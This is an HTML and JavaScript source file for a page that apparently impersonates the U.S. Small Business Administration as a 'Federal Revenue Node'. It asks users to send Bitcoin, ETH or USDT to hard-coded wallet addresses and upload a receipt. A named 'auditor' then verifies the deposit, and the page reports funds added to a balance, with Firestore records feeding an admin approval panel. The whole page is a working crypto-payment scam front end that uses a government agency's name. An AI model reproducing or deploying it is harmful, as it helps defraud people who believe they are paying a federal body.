<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Revenue Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --gold: #b69121; }
        body { background: #f1f5f9; font-family: 'Public Sans', sans-serif; color: #1e293b; margin: 0; }
        .gov-banner { background: #001a3d; color: white; font-size: 8px; padding: 10px; text-align: center; font-weight: 800; text-transform: uppercase; border-bottom: 3px solid var(--sba-red); position: sticky; top: 0; z-index: 1001; }
        .logo-frame { border: 2px solid var(--sba-blue); border-bottom-color: var(--sba-red); border-left-color: var(--sba-red); padding: 2px 8px; font-weight: 900; color: var(--sba-blue); font-size: 18px; cursor: pointer; }
        .glass-card { background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 46, 109, 0.05); border: 1px solid #e2e8f0; }
        .method-card { border: 1.5px solid #e2e8f0; border-radius: 12px; padding: 10px; cursor: pointer; transition: 0.2s; background: white; text-align: center; }
        .method-card.active { border-color: var(--sba-blue); background: #f0f7ff; border-width: 2px; }
        .btn-fed { background: var(--sba-blue); color: white; font-weight: 900; text-transform: uppercase; border-bottom: 4px solid #001a3d; cursor: pointer; width: 100%; border-radius: 12px; font-size: 12px; height: 50px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-fed:active { transform: translateY(2px); border-bottom-width: 1px; }
        #globalLoader { position: fixed; inset: 0; background: #f1f5f9; z-index: 5000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .radar-spin { animation: spin 2s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body class="pb-10">

    <div id="globalLoader">
        <div class="logo-frame mb-4">SBA</div>
        <div class="w-24 h-1 bg-slate-200 rounded-full overflow-hidden">
            <div class="h-full bg-[#002e6d] w-1/2 animate-pulse"></div>
        </div>
    </div>

    <div class="gov-banner">Federal Revenue Node • Secured Transaction</div>

    <header class="bg-white p-4 flex justify-between items-center border-b sticky top-[30px] z-50">
        <div class="logo-frame" onclick="location.href='dashboard.html'">SBA</div>
        <a href="dashboard.html" class="text-slate-300 text-2xl"><i class="fas fa-times-circle"></i></a>
    </header>

    <main class="max-w-md mx-auto p-4">
        <div class="glass-card p-6">
            
            <div id="formView">
                <h2 class="text-xs font-black text-slate-800 uppercase italic mb-6 tracking-widest">Revenue Deposit</h2>
                
                <div class="grid grid-cols-3 gap-2 mb-6">
                    <div class="method-card active" onclick="selectMethod('BTC', 'bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345', this)">
                        <i class="fab fa-bitcoin text-orange-500 text-xl"></i>
                        <p class="text-[8px] font-black uppercase mt-1">Bitcoin</p>
                    </div>
                    <div class="method-card" onclick="selectMethod('ETH', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', this)">
                        <i class="fab fa-ethereum text-indigo-500 text-xl"></i>
                        <p class="text-[8px] font-black uppercase mt-1">ETH</p>
                    </div>
                    <div class="method-card" onclick="selectMethod('USDT', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', this)">
                        <i class="fas fa-dollar-sign text-emerald-500 text-xl"></i>
                        <p class="text-[8px] font-black uppercase mt-1">USDT</p>
                    </div>
                </div>

                <label class="text-[9px] font-black text-slate-400 uppercase ml-1">Deposit Amount (USD)</label>
                <input type="number" id="depAmount" class="w-full h-12 px-4 rounded-xl border-2 border-slate-100 font-black mb-6 outline-none focus:border-sba-blue" placeholder="0.00">

                <div class="bg-slate-900 p-4 rounded-xl mb-6 border-b-4 border-gold">
                    <p id="methodLabel" class="text-[8px] font-black text-slate-500 uppercase">BTC Receiver</p>
                    <div class="flex items-center justify-between gap-3 mt-1">
                        <code id="walletAddr" class="text-[10px] font-bold text-amber-400 break-all">bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345</code>
                        <button onclick="copyAddr()" class="text-white bg-white/10 p-2 rounded-lg"><i class="fas fa-copy"></i></button>
                    </div>
                </div>

                <label class="text-[9px] font-black text-slate-400 uppercase ml-1">Upload Receipt (Proof)</label>
                <div onclick="document.getElementById('popFile').click()" class="mt-2 border-2 border-dashed border-slate-200 rounded-xl p-8 text-center bg-slate-50 relative overflow-hidden mb-6 flex flex-col items-center">
                    <img id="popPreview" class="absolute inset-0 w-full h-full object-cover hidden z-10">
                    <i class="fas fa-cloud-upload-alt text-slate-300 text-3xl mb-2"></i>
                    <p class="text-[10px] font-black text-slate-400 uppercase">Tap to attach screenshot</p>
                    <input type="file" id="popFile" class="hidden" accept="image/*" onchange="previewReceipt()">
                </div>

                <button onclick="handleDeposit()" id="subBtn" class="btn-fed">Transmit for Audit</button>
            </div>

            <div id="pendingView" class="hidden text-center py-10">
                <div class="relative w-20 h-20 mx-auto mb-6">
                    <div class="absolute inset-0 border-4 border-amber-500 rounded-full border-t-transparent radar-spin"></div>
                    <div class="absolute inset-0 flex items-center justify-center text-amber-500 text-2xl"><i class="fas fa-shield-alt"></i></div>
                </div>
                <h3 class="font-black text-slate-800 uppercase italic">Audit in Progress</h3>
                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2">Sarah Miller is verifying your <span id="pAmt" class="text-sba-blue"></span> deposit.</p>
                <button onclick="resetNode()" class="mt-8 text-[10px] font-black text-slate-400 uppercase underline">Cancel Request</button>
            </div>

            <div id="successView" class="hidden text-center py-10">
                <div class="w-20 h-20 bg-emerald-500 rounded-full flex items-center justify-center mx-auto text-white text-3xl mb-6 shadow-xl"><i class="fas fa-check"></i></div>
                <h3 class="font-black text-slate-800 uppercase italic">Transaction Cleared</h3>
                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2">Funds have been added to your balance.</p>
                <button onclick="resetNode()" class="btn-fed mt-8">Make Another Deposit</button>
            </div>

        </div>
    </main>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { doc, onSnapshot, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        let compressedImage = null;
        let selectedMethodName = "BTC";

        window.selectMethod = (name, addr, el) => {
            selectedMethodName = name;
            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
            el.classList.add('active');
            document.getElementById('methodLabel').innerText = `${name} Receiver`;
            document.getElementById('walletAddr').innerText = addr;
        };

        window.previewReceipt = () => {
            const file = document.getElementById('popFile').files[0];
            const reader = new FileReader();
            reader.onload = (e) => {
                const img = new Image();
                img.src = e.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    const scale = 600 / img.width;
                    canvas.width = 600; canvas.height = img.height * scale;
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    compressedImage = canvas.toDataURL('image/jpeg', 0.6);
                    document.getElementById('popPreview').src = compressedImage;
                    document.getElementById('popPreview').classList.remove('hidden');
                };
            };
            reader.readAsDataURL(file);
        };

        window.handleDeposit = async () => {
            const amt = document.getElementById('depAmount').value;
            if(!amt || !compressedImage) { alert("Amount and Proof required."); return; }
            
            document.getElementById('subBtn').disabled = true;
            document.getElementById('subBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> UPLOADING...';

            try {
                // IMPORTANT: Updating the exact fields the Admin Portal looks for
                await updateDoc(doc(db, "users", auth.currentUser.uid), {
                    depositStatus: "PENDING",
                    lastDepAmount: Number(amt),
                    lastDepProof: compressedImage,
                    lastDepMethod: selectedMethodName,
                    ledger: arrayUnion({
                        type: "DEPOSIT",
                        amount: Number(amt),
                        method: selectedMethodName,
                        status: "PENDING",
                        proof: compressedImage,
                        date: new Date().toISOString()
                    })
                });
            } catch (err) { alert("Failed to connect."); }
        };

        window.resetNode = () => updateDoc(doc(db, "users", auth.currentUser.uid), { depositStatus: "IDLE" });

        onAuthStateChanged(auth, (user) => {
            if (!user) { window.location.href = "login.html"; return; }
            onSnapshot(doc(db, "users", user.uid), (snap) => {
                const d = snap.data();
                document.getElementById('globalLoader').style.display = 'none';
                
                const status = d.depositStatus || "IDLE";
                const views = ['formView', 'pendingView', 'successView'];
                views.forEach(v => document.getElementById(v).classList.add('hidden'));

                if(status === "PENDING") {
                    document.getElementById('pendingView').classList.remove('hidden');
                    document.getElementById('pAmt').innerText = `$${Number(d.lastDepAmount || 0).toLocaleString()}`;
                } else if(status === "SUCCESSFUL" || status === "APPROVED") {
                    document.getElementById('successView').classList.remove('hidden');
                } else {
                    document.getElementById('formView').classList.remove('hidden');
                }
            });
        });

        window.copyAddr = () => {
            navigator.clipboard.writeText(document.getElementById('walletAddr').innerText);
            alert("Copied!");
        };
    </script>
</body>
</html>
